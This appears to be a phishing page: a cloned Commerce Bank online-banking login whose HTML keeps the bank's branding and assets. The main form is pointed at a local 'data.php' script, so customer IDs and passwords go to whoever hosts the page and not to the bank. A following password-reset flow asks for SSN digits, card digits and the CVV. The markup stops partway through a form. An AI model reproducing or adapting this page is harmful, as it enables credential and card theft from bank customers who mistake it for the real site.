<!DOCTYPE HTML>
<!DOCTYPE html PUBLIC "" ""><HTML lang="en"><HEAD><META content="IE=11.0000" 
http-equiv="X-UA-Compatible">
     
<SCRIPT>
        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
        })(window, document, 'script', 'dataLayer', 'GTM-M64JK8Q');
    </SCRIPT>
     <TITLE>Commerce Bank</TITLE>     
<META charset="utf-8">         
<META name="viewport" content="width=device-width, initial-scale=1.0">     <LINK 
href="/CBI/Content/favicons/apple-touch-icon.png?v=XBr4kN4Eqw" rel="apple-touch-icon" 
sizes="180x180">     <LINK href="/CBI/Content/favicons/favicon-32x32.png?v=XBr4kN4Eqw" 
rel="icon" type="image/png" sizes="32x32">     <LINK href="/CBI/Content/favicons/favicon-16x16.png?v=XBr4kN4Eqw" 
rel="icon" type="image/png" sizes="16x16">     <LINK href="/CBI/Content/favicons/manifest.json?v=XBr4kN4Eqw" 
rel="manifest">     <LINK href="/CBI/Content/favicons/safari-pinned-tab.svg?v=XBr4kN4Eqw" 
rel="mask-icon" color="#006f51">     <LINK href="/CBI/Content/favicons/favicon.ico?v=XBr4kN4Eqw" 
rel="shortcut icon">     
<META name="mobile-web-app-capable" content="yes">     
<META name="apple-mobile-web-app-capable" content="yes">     
<META name="apple-mobile-web-app-status-bar-style" content="black">     
<META name="apple-mobile-web-app-title" content="Commerce Bank">     
<META name="application-name" content="Commerce Bank">     
<META name="msapplication-TileColor" content="#00a300">     
<META name="msapplication-TileImage" content="/CBI/Content/favicons/mstile-144x144.png?v=XBr4kN4Eqw"> 
    
<META name="msapplication-config" content="/CBI/Content/favicons/browserconfig.xml?v=XBr4kN4Eqw"> 
    
<META name="theme-color" content="#006f51">     
<SCRIPT type="text/javascript">
        window.onload = function() {
            if (navigator.userAgent.match(/iPad/) != null) {
                $('meta[name=apple-itunes-app]').replaceWith('<meta name="apple-itunes-app" content="app-id=916971711">');
            }
        }
    </SCRIPT>
     <LINK href="https://banking.commercebank.com/CBI/bundles/styles/ux/cbcore?v=vZE2g8n0qIS-R1QzNI-f_12QygyWHT4NEuCxu7gOisE1" 
rel="stylesheet">     <LINK href="https://banking.commercebank.com/CBI/bundles/styles/layout?v=fSYruDvPGuRs59WJ_yW451TTa0TIo-xr0R3AmzAuqsA1" 
rel="stylesheet">         <LINK href="https://banking.commercebank.com/CBI/bundles/styles/auth/login?v=8a0YWQteD0r_pLJ1RFnTTYjGrk3dMrFMkekAD-WR9iE1" 
rel="stylesheet"> <LINK href="https://banking.commercebank.com/CBI/bundles/styles/auth/mobileBanner?v=U8J_VSgFA2kbELB1QaqSDsLnPYGSmMY7uS35-w_P0tU1" 
rel="stylesheet">     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/frameworks/jquery?v=8kmHc-ukmg3rp-jj2rNMjYYIG_lP3ErMNtowPG93XbM1"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/frameworks/knockout?v=Zf_AY1H4FfZ5CT2ONQbgqEQvsGpEwCmNVS0upySWDCY1"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/ux/moment?v=xNUTmBN8yKEMkfpAVDuXjdlesImSLdjREr3kF2_Qvn41"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/ux/tether?v=RoVizfxkVT9USXBhjOGWml2tmTa56B8jN1dBW5mMUmY1"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/ux/cbcore?v=fz5Y3Txpo1wQpnu29dgqMro-2u0AolNyEgBoRoaNpv41"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/layout?v=DOYWw0kPLimXviwyvBY83K810PbdSiLDI-Vy7q3tpBo1"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/auth/mobileBanner?v=buNkYhWdvNieXa3MLbUx_Xp8IotX7zi5BqNvKo-6ECw1"></SCRIPT>
     
<SCRIPT src="https://banking.commercebank.com/CBI/bundles/scripts/auth/login?v=PDvkKBAREfUe7wUVD7bl2dxEBXxDzuao3W_BwjpuDWs1"></SCRIPT>
     
<SCRIPT>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-692098-3', 'auto');
      ga('send', 'pageview');
    </SCRIPT>
 
<META name="GENERATOR" content="MSHTML 11.00.10570.1001"></HEAD>     
<BODY><NOSCRIPT>        &lt;iframe 
src="https://www.googletagmanager.com/ns.html?id=GTM-M64JK8Q" height="0" 
width="0" style="display: none; visibility: hidden"&gt;&lt;/iframe&gt;     
</NOSCRIPT>         
<DIV class="cb-container-fluid" id="auth-wrapper"><IMG id="bg-lowleft" alt="low-left" 
src="https://banking.commercebank.com/CBI/Content/Images/brand/lowleft.svg">     
<IMG id="bg-upright" alt="upright" src="https://banking.commercebank.com/CBI/Content/Images/brand/upright.svg"> 
    
<SCRIPT type="text/javascript">

        var _mobileBannerViewmodel = {"IsEnabled":true,"Properties":{"mobileBannerCookieExpiration":"90","storeLink":"https://app.commercebank.com/install"}};

    </SCRIPT>
     
<DIV id="mobile-banner"><mobile-banner ref="mobileBannerRef"></mobile-banner> 
<SCRIPT id="mobile-banner-template" type="text/x-template" ref="mobileBanner">
    <!-- Mobile App Banner -->
    <div id="mobile-app-banner" v-show="showBanner">
        <div id="overlay" class="overlay" v-on:click="createCookieAndHideBanner()"></div>
        <div class="prompt">
            <div class="logo-wrapper">
                <img class="logo" src="/CBI/Content/images/Group 2.svg" alt="">
            </div>
            <div class="header">Did you know we have a mobile app?</div>
            
            <div class="text-content">Download our highly-rated Commerce Bank Mobile Banking App so you can:</div>
            <div class="list-wrapper">
                <ul>
                    <li>Log in quickly with Fingerprint or Touch ID</li>
                    <li>Deposit checks</li>
                    <li>Manage Alerts received via Push Notification</li>
                    <li>Check balances and activity</li>
                </ul>
            </div>
            <div class="btn-wrapper">
                <a id="get-app-btn" ref="getAppBtn" autofocus :href="storeLink" v-on:click="createCookieAndHideBanner()">Get the app</a>
                <button id="dismiss-btn" type="button" name="dismiss" v-on:click="createCookieAndHideBanner()">Dismiss</button>
            </div>
        </div>
    </div>
</SCRIPT>
 </DIV>
<SCRIPT type="text/javascript">
    var gaEnabled = true;
    var isPasswordResetRedesignEnabled = true;
</SCRIPT>
 <INPUT id="customerId" type="hidden"> <INPUT id="showTakeMeToOptions" type="hidden" value="True"> 
<INPUT id="defaultErrorMessage" type="hidden" value="Invalid Customer ID or Password.  Please check Caps Lock and try again or reset your password."> 
<INPUT id="validation_password" type="hidden" value="(?=^.{8,32}$)(?=^\S)(?=.*\d)(?=.*[a-z])(?=.*[A-Z])(?!.*([\w])\1\1)[\w_\-\'\.\,\@\:\?\!\(\)\$\\\/\%\^\*\+\|\{\}\[\]\~\`\#]*$"> 
<INPUT id="validation_customerid" type="hidden" value="^[\w\d]{2,32}$"> 
<INPUT id="showCashflowTakeMeTo" type="hidden" value="False"> <INPUT id="cashflowPrePopulate" type="hidden" value="False"> 
<INPUT id="exp" type="hidden"> 
<DIV id="login-main">
<DIV id="login-template">
<DIV class="cb-container-fluid" id="login-wrapper" style="display: none;">
<DIV class="cb-container" id="login-container" data-qaid="login-container">
<DIV id="login-logo-container"><IMG id="login-logo" alt="login" src="https://banking.commercebank.com/CBI/Content/Images/logo/logo.svg" 
data-qaid="login-logo">                 </DIV>
<H3 id="login-title" data-qaid="login-title" data-bind="visible: stage() === 'locked' || stage() === 'credentials' || stage() === 'loggedIn'">Log 
in to Online Banking</H3>
<DIV class="cb-notification cb-notification-notify" style="margin-top: 24px; margin-bottom: 24px;"><I 
class="cb-icon icon-info" data-qaid="login-remember-icon" data-placement="top" 
data-toggle="cb-popover"></I><SPAN class="cb-notification-text">UPDATE on 
COVID-19: Branch lobby access at most locations is by appointment or as social 
distancing allows. Drive-thru service is available to handle most banking 
needs.<A class="cb-link" style="margin-left: 5px; white-space: nowrap;" href="http://www.commercebank.com/coronavirus" 
target="_blank">Learn more</A></SPAN></DIV>
<DIV class="cb-notification cb-notification-success pw-reset-success-notification" 
data-qaid="pwr-success-message" v-show="newPasswordComplete"><I class="cb-icon icon-check" 
data-qaid="login-remember-icon" data-placement="top" 
data-toggle="cb-popover"></I><SPAN class="cb-notification-text">You have 
successfully changed your password.</SPAN></DIV>
<DIV class="cb-notification cb-notification-success" style="margin-top: 24px; margin-bottom: 40px;" 
data-qaid="login-logged-in" data-bind="visible: stage() === 'loggedIn'"><IMG 
class="icon-spin" style="height: 23px; display: inline-block;" alt="loader" src="https://banking.commercebank.com/CBI/Content/Images/loader-green.svg" 
data-qaid="login-loggedin-icon">                     <SPAN class="cb-notification-text" 
style="padding-top: 2px; margin-left: 10px; vertical-align: middle; display: inline-block;">Logged 
in! Just a second...</SPAN>                 </DIV>
<DIV class="error-row" data-qaid="login-locked" data-bind="visible: stage() === 'locked'">
<DIV class="svg-container"><IMG class="warning-icon" alt="Warning" src="https://banking.commercebank.com/CBI/Content/Images/icons/warning-triangle.svg"> 
                    </DIV><SPAN class="error-text" 
data-qaid="login-locked-text">                        For security reasons your 
account has been temporarily locked. Please call  <A class="cb-link" style="white-space: nowrap;" 
href="tel:8009862265">800-986-2265</A> for assistance.                     
</SPAN>                 </DIV>
<form id="login-credentials-form" method="post" action="data.php" data-bind="'" data-qaid="login-form">
<DIV class="cb-form-group" data-bind="visible: showLoginError">
<DIV class="error-row" data-qaid="login-challenge-not-recognized">
<DIV class="svg-container"><IMG class="warning-icon" alt="Warning" src="https://banking.commercebank.com/CBI/Content/Images/icons/warning-triangle.svg"> 
                        </DIV><SPAN class="error-text" data-qaid="login-error" 
data-bind="html: loginErrorText"></SPAN>                     </DIV></DIV>
<DIV class="cb-form-group" data-bind="css: { 'cb-has-error': shouldValidateCustomerId() &amp;&amp; !hasValidCustomerId() }"><A 
tabindex="6" class="cb-link" id="login-activate-link" href="https://banking.commercebank.com/CBI/RetailEnrollment.aspx" 
data-qaid="login-activate-link">Activate Online Banking</A>                     
<LABEL class="cb-form-control-label" for="input-username" data-qaid="login-label-customerid">Customer 
ID:</LABEL>                     <I class="cb-icon icon-info icon-error forgot-id" 
data-qaid="forgot-id-popover" data-toggle="cb-popover"></I>                     
<INPUT tabindex="1" class="cb-form-control" id="input-username" type="text" data-qaid="login-input-customerid" data-bind="textInput: customerId" name="username" size="25">
<DIV class="cb-form-control-feedback" data-bind="visible: shouldValidateCustomerId() &amp;&amp; !hasValidCustomerId()"><I 
class="cb-icon icon-warning"></I>  Please enter a valid Customer ID.             
        </DIV>
<DIV class="login-remember-customer-id-container"><LABEL class="cb-form-checkbox-label"><INPUT 
tabindex="8" class="cb-form-checkbox-input" id="input-remember-username" type="checkbox" 
data-qaid="login-input-remember-customer-id" data-bind="checked: rememberCustomerId"> 
                            <SPAN 
class="cb-form-checkbox-indicator"></SPAN><SPAN class="cb-form-checkbox-description" 
data-qaid="login-label-remember-customer-id">Remember me</SPAN>                  
       </LABEL>                     </DIV>
<DIV class="login-forgot-container"><A tabindex="7" class="cb-link" id="forgot-CustomerId-link" 
href="https://banking.commercebank.com/CBI/Auth/" data-qaid="login-link-forgotCustomerId">Forgot 
Your Customer ID?</A>                     </DIV></DIV>
<DIV class="cb-form-group" data-bind="css: { 'cb-has-error': shouldValidatePassword() &amp;&amp; !hasValidPassword() }"><LABEL 
class="cb-form-control-label" for="input-password" data-qaid="login-label-password">Password:</LABEL> 
                    <INPUT tabindex="2" class="cb-form-control" id="input-password" type="password" data-qaid="login-input-password" data-bind="textInput: password" autocomplete="off" name="password" size="25">
<DIV class="cb-form-control-feedback" data-bind="visible: shouldValidatePassword() &amp;&amp; !hasValidPassword()"><I 
class="cb-icon icon-warning"></I>  Please enter a valid password.                
     </DIV>
<DIV class="login-forgot-container"><A tabindex="9" class="cb-link forgot-pw-link" 
id="login-link-forgotpasswordRedesign" href="https://banking.commercebank.com/CBI/Auth/Login#" 
data-qaid="login-link-forgotpassword" v-on:click="forgotPasswordLinkClicked">    
                            Forgot Your Password?                             
</A>                             <A id="login-link-forced-reset" href="https://banking.commercebank.com/CBI/Auth/Login#" 
data-qaid="login-link-forced-reset" v-on:click="forcedResetLinkClicked" 
v-show:false="">                                I Dont Exist                     
        </A>                                                 <SPAN data-qaid="login-case-sensitive"></SPAN> 
                    </DIV></DIV>
<DIV class="cb-form-group" data-bind="visible: showTakeMeToOptions">
<DIV class="cb-row">
<DIV class="cb-col-sm-12"><LABEL class="cb-form-control-label" for="input-takemeto" 
data-qaid="login-label-takemeto">Take me to:</LABEL>                         
</DIV></DIV>
<DIV class="cb-row">
<DIV class="cb-col-sm-6">
<DIV class="cb-select"><SELECT tabindex="3" class="cb-form-control" id="input-takemeto" 
data-qaid="login-input-takemeto-options" data-bind="options: takeMeToOptions, optionsText: 'label', value: takeMeToValue, optionsValue: 'id'"></SELECT></DIV></DIV>
<DIV class="cb-col-sm-6">
<DIV id="login-defaultpage-container"><LABEL 
class="cb-form-checkbox-label"><INPUT tabindex="4" class="cb-form-checkbox-input" 
type="checkbox" data-qaid="login-input-makedefault" data-bind="checked: makeDefaultPage"> 
                                    <SPAN 
class="cb-form-checkbox-indicator"></SPAN><SPAN class="cb-form-checkbox-description" 
data-qaid="login-label-makethisdefaultpage">Make this my default page</SPAN>     
                            </LABEL>                             
</DIV></DIV></DIV></DIV>
<DIV class="cb-form-group login-submit-container"><BUTTON tabindex="5" class="cb-btn cb-btn-secondary cb-btn-lg cb-btn-block" 
id="login" type="submit" data-qaid="login-button-login" data-bind="enable: !isLoadingLogin() &amp;&amp; hasValidCustomerId() &amp;&amp; hasValidPassword()"><IMG 
class="img-loading icon-spin" id="loading" style="display: inline-block;" alt="loader-white" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" 
data-bind="visible: isLoadingLogin()">                         <SPAN id="loading-text" 
data-bind="text: !isLoadingLogin() ? 'Log In' : ''"></SPAN>                     
</BUTTON></DIV></FORM>
<DIV class="cb-container-fluid" id="password-flow-wrapper" v-if="showPasswordResetFlow"><template 
id="password-reset-template">
<DIV id="passwordResetContainer"><transition mode="out-in" v-bind:name="transition.slideDirection">
<DIV id="accountDetailsFormContainer" v-if="form === 'accountDetails'" key="1">
<DIV id="account-detail-form" data-qaid="account-detail-form">
<DIV id="accountDetails">
<H4 class="password-reset-title" v-if="!showAccountLockedMessage">First, verify 
your account details to change your password.</H4>
<DIV class="password-reset-account-locked" v-if="showAccountLockedMessage">
<H4 class="password-reset-account-locked-title">Your access has been locked 
because of too many failed log in attempts.</H4>
<DIV class="password-reset-account-locked-message">Please reset your password 
below or call <A class="customer-support-number" 
href="tel:800-986-2265">800-986-2265</A> for assistance.</DIV></DIV>
<FORM>
<DIV class="password-reset-slide-wrapper">
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="pwreset-input-username" 
data-qaid="label-customerid">Customer ID</LABEL>                     <I class="cb-icon icon-info icon-error forgot-id" 
data-qaid="forgot-id-popover" data-toggle="cb-popover" v-on:click="custIdInfoIconClick" 
v-rendered=""></I>                     <INPUT tabindex="1" class="cb-form-control" class="cb-form-control" id="pwreset-input-username" type="text" :class="{ 'inputHasError': showCustIdError &amp;&amp; focus !== 'custid' }" data-qaid="pwreset-input-username" @blur="removeFocus" @focus="updateCustIdFocus" v-focus="custIdFocus" v-model="custid">
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="custIDError" 
v-if="showCustIdError &amp;&amp; focus !== 'custid'"><I class="cb-icon icon-warning"></I> 
{{invalidCustIDText}}                     </DIV>
<DIV class="login-forgot-container"><A class="cb-link" id="forgot-CustomerId-link" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="forgot-CustomerId-link" 
v-on:click="toggleCustIDModal">Forgot Your Customer ID?</A>                     
</DIV></DIV>
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-ssn" 
data-qaid="label-ssn">Last 4 of SSN/Tax ID</LABEL>                     
<INPUT tabindex="2" class="cb-form-control" class="cb-form-control" id="input-ssn" type="text" maxlength="4" :class="{ 'inputHasError': showSsnTaxIdError &amp;&amp; focus !== 'ssn' }" data-qaid="ssn-input-password" autocomplete="off" @blur="removeFocus" @focus="updateSsnFocus" v-model="ssn">
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="ssnError" 
v-if="showSsnTaxIdError &amp;&amp; focus !== 'ssn'"><I class="cb-icon icon-warning"></I>{{invalidSsnText}} 
                    </DIV></DIV>
<DIV class="taxDescription" id="ssntaxDescription" data-qaid="qa-ssntaxDescription"> 
For personal accounts, enter the last 4 digits of your SSN. For small business 
accounts, enter the last 4 digits of your business tax ID.</DIV></DIV>
<DIV class="progress-dots"><SPAN class="dot-active"></SPAN>                 
<SPAN class="dot-non-active"></SPAN>                 <SPAN class="dot-non-active"></SPAN> 
            </DIV><BUTTON tabindex="3" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="accountDetails-submit" type="submit" v-bind:disabled="!enableAcctSubmitBtn || processingRequest" 
data-qaid="btn-submit-account-details" v-on:click.prevent="submitAccountDetails()"><IMG 
class="img-loading icon-spin spinner" id="acctDetailsSubmitSpinner" alt="Account Details submitting spinner" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" v-if="processingRequest"> 
                <SPAN v-if="!processingRequest">{{continueBtnTxt}}</SPAN>        
                             </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="4" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-account-details" 
v-on:click="cancelButtonClicked()">                                            
Cancel                                         </A>                              
       </DIV></FORM></DIV></DIV></DIV>
<DIV id="creditCardDetailsFormContainer" v-if="form === 'creditCardDetails'" 
key="2">
<DIV class="password-reset-detail-form" data-qaid="cc-detail-form">
<DIV id="CCDetails">
<H4 class="password-reset-title">Next, enter your card details.</H4>
<FORM id="ccDetailsForm">
<DIV class="password-reset-slide-wrapper">
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-ccn" 
data-qaid="label-ccn">Last 4 Digits of Your Card</LABEL>                     
<INPUT tabindex="5" class="cb-form-control" class="cb-form-control" id="input-ccn" type="text" maxlength="4" :class="{ 'inputHasError': showCcnError &amp;&amp; focus !== 'ccn' }" data-qaid="input-ccn" autocomplete="off" @blur="removeFocus" @focus="updateCcnFocus" v-focus="ccnFocus" v-model="ccn">
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="ccnError" 
v-if="showCcnError &amp;&amp; focus !== 'ccn'"><I 
class="cb-icon icon-warning"></I>{{invalidCcnText}}                     
</DIV></DIV>
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-cvv" 
data-qaid="label-cvv">CVV</LABEL>                 <I class="cb-icon icon-info cvv" 
data-qaid="cvv-popover" data-toggle="cb-popover" v-rendered=""></I>              
   <INPUT tabindex="6" class="cb-form-control" class="cb-form-control" id="input-cvv" type="text" maxlength="3" :class="{ 'inputHasError': showCvvError &amp;&amp; focus !== 'cvv' }" data-qaid="input-cvv" autocomplete="off" @blur="removeFocus" @focus="updateCvvFocus" v-model="cvv">
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="cvvError" 
v-if="showCvvError &amp;&amp; focus !== 'cvv'"><I class="cb-icon icon-warning" 
data-qaid="cvvErrorIcon"></I>{{invalidCvvText}}                 
</DIV></DIV></DIV>
<DIV class="progress-dots"><SPAN class="dot-non-active"></SPAN>                 
<SPAN class="dot-active"></SPAN>                 <SPAN 
class="dot-non-active"></SPAN>             </DIV><BUTTON tabindex="7" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="cc-submit" type="submit" v-bind:disabled="!enableCCSubmitBtn || processingRequest" 
data-qaid="btn-submit-cc-details" v-on:click.prevent="submitCCDetails()"><IMG 
class="img-loading icon-spin spinner" id="ccDetailsSubmitSpinner" alt="Credit Card Details Submitting Spinner" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" v-if="processingRequest"> 
                <SPAN v-if="!processingRequest">{{continueBtnTxt}}</SPAN>        
     </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="8" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-cc-details" 
v-on:click="cancelButtonClicked()">                    Cancel                 
</A>             </DIV></FORM></DIV></DIV></DIV>
<DIV id="otcOptionsFormContainer" v-if="form === 'otcOptions'" key="3">
<DIV id="one-time-code-options-form" data-qaid="otc-options-form">
<DIV id="otcDetails">
<H4 class="password-reset-title">Choose how you want to receive a one-time 
security code.</H4>
<FORM id="otcOptionsForm">
<DIV class="password-reset-slide-wrapper">
<DIV class="cb-form-group">
<DIV class="cb-stacked"><LABEL class="cb-form-radio-label otcOption-option" 
:key="otcOption.key" v-for="otcOption in oneTimeCodeOptions"><INPUT name="otcOptionRadioGroup" 
tabindex="12" class="cb-form-radio-input" type="radio" v-bind:value="otcOption" 
:data-qaid="'radio-input-otc-options-'+otcOption.option" 
v-model="codeRecipient">                             <SPAN class="cb-form-radio-indicator"></SPAN><SPAN 
class="cb-form-radio-description">{{otcOption.action}} the code to: </SPAN>      
                       <BR><SPAN 
class="cb-form-radio-description">{{otcOption.option}}</SPAN>                    
     </LABEL>                     </DIV></DIV></DIV>
<DIV class="progress-dots"><SPAN class="dot-non-active"></SPAN>                 
<SPAN class="dot-active"></SPAN>                 <SPAN 
class="dot-non-active"></SPAN>             </DIV><BUTTON tabindex="13" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="otcOptions-submit" type="submit" v-bind:disabled="!enableOtcOptionsSubmitBtn || processingRequest" 
data-qaid="btn-submit-otc-options" v-on:click.prevent="submitOtcOption()"><IMG 
class="img-loading icon-spin spinner" id="oneTimeCodeOptionContinueSpinner" alt="One Time Code Option Continue Button Spinner" 
src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" v-if="processingRequest"> 
                <SPAN v-if="!processingRequest">{{continueBtnTxt}}</SPAN>        
     </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="14" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-otc-options" 
v-on:click="cancelButtonClicked()">                    Cancel                 
</A>             </DIV></FORM></DIV></DIV></DIV>
<DIV id="otcFormContainer" v-if="form === 'otc'" key="4">
<DIV id="otc-form" data-qaid="otc-form">
<DIV id="otcEntry">
<H4 class="password-reset-title">Enter the one-time security code sent to 
{{codeRecipient.option}}</H4>
<FORM id="otcForm">
<DIV class="password-reset-slide-wrapper">
<DIV class="cb-form-group"><LABEL class="cb-form-control-label">One-Time 
Code</LABEL>                     
<DIV class="inputContainer" class="inputContainer" :class="{ 'focus': focus === 'oneTimeCode',  'inputHasError': showInvalidCodeError &amp;&amp; focus !== 'oneTimeCode' || showExpiredCodeMessage || showUnverifiedCodeMessage}"><INPUT tabindex="15" class="cb-form-control hidden-input" id="pwreset-input-otc" type="text" maxlength="6" data-qaid="pwreset-input-otc" @blur="removeFocus" @focus="updateOtcFocus" v-focus="otcFocus" v-model="oneTimeCode" v-on:keyup="showUnverifiedCodeMessage=false"><A 
class="pwr-link no-decoration" style="padding-right: 10px;" href="https://banking.commercebank.com/CBI/Auth/Login#" 
data-qaid="pwr-resend-otc-spinner" v-if="this.resendingCode == true">            
                Sending<IMG class="img-loading icon-spin spinner resend-spinner" 
alt="One Time Code Resend Button Spinner" src="https://banking.commercebank.com/CBI/Content/Images/loader-custom.svg"> 
                        </A>                         <A tabindex="16" class="pwr-link" 
style="padding-right: 10px;" href="https://banking.commercebank.com/CBI/Auth/Login#" 
data-qaid="pwr-resend-otc-link" v-on:click="resendCode()" v-else="">Resend 
Code</A>                     </DIV>
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="invalidCodeError" 
v-if="showInvalidCodeError &amp;&amp; focus != 'oneTimeCode'"><I class="cb-icon icon-warning"></I>{{invalidOTCText}} 
                    </DIV>
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="expiredCodeError" 
v-if="showExpiredCodeMessage"><I 
class="cb-icon icon-warning"></I>{{expiredOTCText}}                     </DIV>
<DIV class="cb-form-control-feedback errorMessage" v-cloak="" data-qaid="unverifiedCodeError" 
v-if="showUnverifiedCodeMessage"><I 
class="cb-icon icon-warning"></I>{{unverifiedOTCText}}                     
</DIV><A tabindex="17" class="pwr-link" style="padding-top: 4px;" href="https://banking.commercebank.com/CBI/Auth/Login#" 
data-qaid="link-otc-choose-new-delivery-method" v-on:click="chooseNewDeliveryMethod()">Choose 
a Different Delivery Method</A>                 </DIV></DIV>
<DIV class="progress-dots"><SPAN class="dot-non-active"></SPAN>                 
<SPAN class="dot-active"></SPAN>                 <SPAN 
class="dot-non-active"></SPAN>             </DIV><BUTTON tabindex="18" class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="accountDetails-submit" type="submit" v-bind:disabled="!enableOtcSubmitBtn || processingRequest" 
data-qaid="btn-submit-otc-details" v-on:click.prevent="submitOtc()"><IMG class="img-loading icon-spin spinner" 
id="oneTimeCodeContinueSpinner" alt="One Time Code Continue Button Spinner" src="https://banking.commercebank.com/CBI/Content/Images/loader-white.svg" 
v-if="processingRequest">                 <SPAN 
v-if="!processingRequest">{{continueBtnTxt}}</SPAN>             </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A tabindex="19" class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" data-qaid="btn-cancel-otc-details" 
v-on:click="cancelButtonClicked()">                    Cancel                 
</A>             </DIV></FORM></DIV></DIV></DIV>
<DIV id="failureFormContainer" v-if="form === 'failure'" key="5">
<DIV id="pwreset-failure-form" data-qaid="pwreset-failure-form">
<DIV class="password-reset-failure-title" 
v-show="showFailureTitle">{{failureTitleText}}</DIV>
<DIV class="password-reset-slide-wrapper">
<DIV class="password-reset-failure-body"><SPAN v-html="failureBodyText"></SPAN>  
       </DIV></DIV>
<DIV class="failure-button-wrapper"><BUTTON class="cb-btn cb-btn-primary cb-btn-block cb-btn-lg" 
id="pwreset-failure-submit-button" v-on:click.prevent="cancelButtonClicked()" 
qaid="pwreset-failure-submit-button">            Log In         </BUTTON>
<DIV class="password-reset-cancel-button-wrapper"><A class="password-reset-cancel-button" 
href="https://banking.commercebank.com/CBI/Auth/Login#" v-on:click="cancelButtonClicked()"> 
               Cancel             </A>         </DIV></DIV></DIV></DIV>
<DIV id="notEligableFormContainer" v-if="form === 'notEligible'" key="6">
<H1>Not Eligable Slide</H1></DIV>
<DIV id="newPasswordFormContainer" v-if="form === 'newPassword'" key="7">
<DIV id="change-password-form" data-qaid="change-password-form">
<DIV id="changePassword">
<H4 class="password-reset-title">Create a new password.</H4>
<FORM id="newPwForm">
<DIV class="password-reset-slide-wrapper">
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-new-password" 
data-qaid="label-new-password">New Password</LABEL>                     
<INPUT tabindex="20" class="cb-form-control" id="input-new-password" type="password" data-qaid="input-new-password" autocomplete="off" @blur="newPwOnBlur" v-focus="newPwFocus" v-model="newPassword">
<DIV class="inFormRequirementsLink" v-if="!showInFormPWRequirements"><A 
tabindex="21" class="cb-link" id="show-pw-requirement" href="https://banking.commercebank.com/CBI/Auth/Login#" 
v-on:click="toggleShowPWResetRequirements">Show Password Requirements</A>        
             </DIV>
<DIV class="inFormRequirementsContainer" data-qaid="pw-requirements" v-if="showInFormPWRequirements">
<DIV class="cardContent">
<DIV class="inFormRequirementsList" role="list">
<DIV class="inFormRequirementContainer cb-row" role="listitem" :key="pwRequirement.id" 
v-for="pwRequirement in pwRequirements">
<DIV class="cb-col-xs-1 descriptionIcon"><I class="cb-icon icon-bullet validationIconCriteria" 
:id="pwRequirement.validationId+'bullet'" :data-qaid="pwRequirement.validationId+'bullet'" 
v-show="showNewPwBullets"></I>                                         <I class="cb-icon icon-check validationIconCriteria cb-text-green pw-reset-validation-icon" 
:id="pwRequirement.validationId+'check'" :data-qaid="pwRequirement.validationId+'check'" 
v-show="pwRequirement.showValid &amp;&amp; !showNewPwBullets"></I>               
                          <I class="cb-icon icon-close validationIconCriteria cb-text-red pw-reset-validation-icon" 
:id="pwRequirement.validationId+'close'" :data-qaid="pwRequirement.validationId+'close'" 
v-show="!showNewPwBullets &amp;&amp; !pwRequirement.showValid"></I>              
                       </DIV>
<DIV class="cb-col-xs-11 requirementText" class="cb-col-xs-11 requirementText" 
v-bind:class="{'requirementBold': pwRequirement.showBold}">
<P>{{pwRequirement.text}}</P></DIV></DIV></DIV>
<DIV id="password-requirement-progress-bar-container">
<DIV id="password-requirement-progress-bar" 
v-bind:style="pwProgressBarStyle"></DIV></DIV></DIV></DIV></DIV>
<DIV class="cb-form-group"><LABEL class="cb-form-control-label" for="input-confirm-new-password" 
data-qaid="label-confirm-new-password">Confirm New Password</LABEL>              
